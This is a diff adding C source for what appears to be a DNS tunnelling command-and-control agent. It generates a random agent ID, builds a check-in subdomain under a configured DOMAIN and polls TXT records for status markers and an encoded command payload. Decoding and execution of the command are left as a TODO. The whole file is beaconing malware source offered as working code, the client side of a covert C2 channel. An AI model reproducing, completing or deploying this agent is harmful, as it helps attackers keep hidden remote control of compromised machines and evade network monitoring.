@@ -1,0 +1,129 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <string.h>
+
+#include "utils.h"
+#include "options.h"
+
+/* DNS STUFF */
+#include <sys/types.h>
+#include <resolv.h>
+#include <ctype.h>
+/* DNS STUFF */
+
+// https://stackoverflow.com/a/1941331
+#ifdef DEBUG
+#define Dprintf(fmt, args...) printf(fmt, ##args)
+#else
+#define Dprintf(fmt, args...)
+#endif
+
+typedef enum
+{
+    Idle,
+    Error,
+    Command,
+} status_t;
+
+const char *resp_idle = "v=B2B3FE1C";
+const char *resp_error = "v=D31CFAA4";
+const char *resp_cmd = "v=A9F466E8";
+
+typedef struct Client
+{
+    char *domain;
+
+    char agent_id[6];
+    char agent_id_hex[6 * 2 + 1];
+    char checkin_domain[256];
+
+    char command[255];
+
+    status_t status;
+} client_t;
+
+struct Client *init_client()
+{
+
+    struct Client *client = malloc(sizeof(*client));
+
+    client->domain = DOMAIN;
+    client->status = Idle;
+
+    rand_str(client->agent_id, sizeof(client->agent_id) - 1);
+    str_to_hex_str(client->agent_id, client->agent_id_hex);
+
+    snprintf(client->checkin_domain,
+             sizeof(client->checkin_domain),
+             "%s.%s",
+             client->agent_id_hex,
+             client->domain);
+
+    Dprintf("client init: state          = %d\n", client->status);
+    Dprintf("client init: domain         = %s\n", client->domain);
+    Dprintf("client init: agent_id       = %s\n", client->agent_id);
+    Dprintf("client init: agent_id_hex   = %s\n", client->agent_id_hex);
+    Dprintf("client init: checkin_domain = %s\n", client->checkin_domain);
+
+    return client;
+}
+
+void poll(client_t *client)
+{
+
+    unsigned char answer[300];
+    int len;
+    ns_msg msg;
+    ns_rr rr;
+
+    len = res_query(client->checkin_domain, ns_c_in, ns_t_txt, answer, sizeof(answer));
+
+    if (len <= 0)
+        return;
+
+    if (ns_initparse(answer, len, &msg) < 0)
+        return;
+
+    int rrmax = ns_msg_count(msg, ns_s_an);
+    Dprintf("[d] dns response had %d rrmax values, we only need 1\n", rrmax);
+
+    if (ns_parserr(&msg, ns_s_an, 0, &rr))
+        return;
+
+    const u_char *rd = ns_rr_rdata(rr);
+
+    Dprintf("[d] answer was: %s\n", rd);
+
+    if (strstr((char *)rd, resp_idle) != NULL)
+    {
+        client->status = Idle;
+        return;
+    }
+
+    if (strstr((char *)rd, resp_error) != NULL)
+    {
+        client->status = Error;
+        return;
+    }
+
+    if (strstr((char *)rd, resp_cmd) != NULL)
+    {
+        // double check and make sure we have ,p=
+        if (strstr((char *)rd, ",p=") == NULL)
+        {
+            // something is wrong, lets ignore that response
+            client->status = Idle;
+            return;
+        }
+
+        char *data = strtok((char *)rd, "=");
+        while (data != NULL) {
+            printf("token :%s\n", data);
+            data = strtok(NULL, "=");
+        }
+
+        // TODO: Gunzip, decrypt, json decode to get raw command
+        return;
+    }
+}
